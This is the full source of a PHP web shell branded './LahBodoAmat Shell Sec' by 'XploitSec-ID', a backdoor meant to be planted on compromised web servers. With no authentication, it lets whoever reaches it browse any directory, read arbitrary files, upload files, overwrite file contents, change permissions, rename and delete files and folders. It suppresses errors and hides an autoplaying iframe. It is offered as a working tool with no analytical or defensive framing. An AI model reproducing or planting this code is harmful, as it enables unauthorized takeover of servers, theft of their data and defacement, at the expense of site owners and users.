
<?php error_reporting(0);
 set_time_limit(0);
 if(get_magic_quotes_gpc()){ foreach($_POST as $key=>$value){ $_POST[$key] = stripslashes($value);
 } } echo '<!DOCTYPE HTML>
<html>
<head>
<link href="https://fonts.googleapis.com/css?family=New+Rocker" rel="stylesheet" type="text/css">
<title>./LahBodoAmat Shell Sec</title>
<link href="https://fonts.googleapis.com/css?family=Iceland" rel="stylesheet">
<style>
body{
font-family: New Rocker;
background-color: black;
color:white;
}
#content tr:hover{
background-color: red;
text-shadow: 10px 10px 10px lime;
}
#content .first{
color: black;
background-color: red;
}
table{
border: 1px red solid;
}
a{
color:white;
text-decoration: none;
}
a:hover{
color:blue;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px red solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
.blink_text {
-webkit-animation-name: blinker;
-webkit-animation-duration: 2s;
-webkit-animation-timing-function: linear;
-webkit-animation-iteration-count: infinite;

-moz-animation-name: blinker;
-moz-animation-duration: 2s;
-moz-animation-timing-function: linear;
-moz-animation-iteration-count: infinite;

 animation-name: blinker;
 animation-duration: 2s;
 animation-timing-function: linear;
 animation-iteration-count: infinite;

 color: red;
}
@-moz-keyframes blinker { 
 0% { opacity: 5.0;
 }
 50% { opacity: 0.0;
 }
 100% { opacity: 5.0;
 }
 }
@-webkit-keyframes blinker { 
 0% { opacity: 5.0;
 }
 50% { opacity: 0.0;
 }
 100% { opacity: 5.0;
 }
 }
@keyframes blinker { 
 0% { opacity: 5.0;
 }
 50% { opacity: 0.0;
 }
 100% { opacity: 5.0;
 }
 }
</style> 
</head>
<body>
<script>
window.onload = function() {
var h1 = document.getElementsByTagName("h1")[0],
text = h1.innerText || h1.textContent,
split = [], i, lit = 0, timer = null;
for(i = 0; i < text.length; ++i) {
split.push("<span>" + text[i] + "</span>");
}
h1.innerHTML = split.join("");
split = h1.childNodes;

var flicker = function() {
lit += 0.01;
if(lit >= 1) {
clearInterval(timer);
}
for(i = 0; i < split.length; ++i) {
if(Math.random() < lit) {
split[i].className = "neon";
} else {
split[i].className = "red";
}
}
}
setInterval(flicker, 100);
}
</script></font><center>
<center><b><p><font face="New Rocker" size="6">./LahBodoAmat Shell Sec </font></center></b></p>
<center><img width="580" height="580" src="https://a.top4top.io/p_1522z4wyd0.png"/></center>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font color="green">Path :</font> ';
 if(isset($_GET['path'])){ $path = $_GET['path'];
 }else{ $path = getcwd();
 } $path = str_replace('\\','/',$path);
 $paths = explode('/',$path);
 foreach($paths as $id=>$pat){ if($pat == '' && $id == 0){ $a = true;
 echo '<a href="?path=/">/</a>';
 continue;
 } if($pat == '') continue;
 echo '<a href="?path=';
 for($i=0;
$i<=$id;
$i++){ echo "$paths[$i]";
 if($i != $id) echo "/";
 } echo '">'.$pat.'</a>/';
 } echo '</td></tr><tr><td>';
 if(isset($_FILES['file'])){ if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){ echo '<font color="lime">Upload Succes Slurr</font><br />';
 }else{ echo '<font color="red">Upload Gagal Njer :(</font><br/>';
 } } echo '<form enctype="multipart/form-data" method="POST">
<font color="red">File Upload :</font> <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
 if(isset($_GET['filesrc'])){ echo "<tr><td>Current File : ";
 echo $_GET['filesrc'];
 echo '</tr></td></table><br />';
 echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
 }elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){ echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
 if($_POST['opt'] == 'chmod'){ if(isset($_POST['perm'])){ if(chmod($_POST['path'],$_POST['perm'])){ echo '<font color="lime">Change Permission Success</font><br/>';
 }else{ echo '<font color="red">Change Permission Gagal Ajg ;v</font><br />';
 } } echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
 }elseif($_POST['opt'] == 'rename'){ if(isset($_POST['newname'])){ if(rename($_POST['path'],$path.'/'.$_POST['newname'])){ echo '<font color="lime">Ganti Nama Success</font><br/>';
 }else{ echo '<font color="red">Ganti Nama Gagal njir :(</font><br />';
 } $_POST['name'] = $_POST['newname'];
 } echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
 }elseif($_POST['opt'] == 'edit'){ if(isset($_POST['src'])){ $fp = fopen($_POST['path'],'w');
 if(fwrite($fp,$_POST['src'])){ echo '<font color="lime">Success Edit File</font><br/>';
 }else{ echo '<font color="red">Failed Edit File :(</font><br/>';
 } fclose($fp);
 } echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
 } echo '</center>';
 }else{ echo '</table><br/><center>';
 if(isset($_GET['option']) && $_POST['opt'] == 'delete'){ if($_POST['type'] == 'dir'){ if(rmdir($_POST['path'])){ echo '<font color="lime">Directory Terhapus</font><br/>';
 }else{ echo '<font color="red">Directory Failed Terhapus </font><br/>';
 } }elseif($_POST['type'] == 'file'){ if(unlink($_POST['path'])){ echo '<font color="lime">File Terhapus</font><br/>';
 }else{ echo '<font color="red">File Failed Dihapus</font><br/>';
 } } } echo '</center>';
 $scandir = scandir($path);
 echo '<div id="content"><table style="border-radius:6px;" width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</peller></center></td>
<td><center>Size</peller></center></td>
<td><center>Permission</peller></center></td>
<td><center>Modify</peller></center></td>
</tr>';
 foreach($scandir as $dir){ if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
 echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
 if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
 elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
 echo perms($path.'/'.$dir);
 if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
 echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
 } echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
 foreach($scandir as $file){ if(!is_file($path.'/'.$file)) continue;
 $size = filesize($path.'/'.$file)/1024;
 $size = round($size,3);
 if($size >= 1024){ $size = round($size/1024,2).' MB';
 }else{ $size = $size.' KB';
 } echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
 if(is_writable($path.'/'.$file)) echo '<font color="lime">';
 elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
 echo perms($path.'/'.$file);
 if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
 echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
 } echo '</table>
</div>';
 } echo "<br/><center><table bordercolor='lime' style='border-radius:5px;'><td><b> ./LahBodoAmat | XploitSec-ID</table</b></center>
</body>
</html>";
$ip = getenv("REMOTE_ADDR");

 function perms($file){ $perms = fileperms($file);
 if (($perms & 0xC000) == 0xC000) { $info = 's';
 } elseif (($perms & 0xA000) == 0xA000) { $info = 'l';
 } elseif (($perms & 0x8000) == 0x8000) { $info = '-';
 } elseif (($perms & 0x6000) == 0x6000) { $info = 'b';
 } elseif (($perms & 0x4000) == 0x4000) { $info = 'd';
 } elseif (($perms & 0x2000) == 0x2000) { $info = 'c';
 } elseif (($perms & 0x1000) == 0x1000) { $info = 'p';
 } else { $info = 'u';
 } $info .= (($perms & 0x0100) ? 'r' : '-');
 $info .= (($perms & 0x0080) ? 'w' : '-');
 $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
 $info .= (($perms & 0x0020) ? 'r' : '-');
 $info .= (($perms & 0x0010) ? 'w' : '-');
 $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
 $info .= (($perms & 0x0004) ? 'r' : '-');
 $info .= (($perms & 0x0002) ? 'w' : '-');
 $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
 return $info;
 } 
?>
<iframe width="0" height="0" frameborder="0" allow="autoplay" src="https://b.top4top.io/m_151281xxb0.m4" allowfullscreen/></iframe>
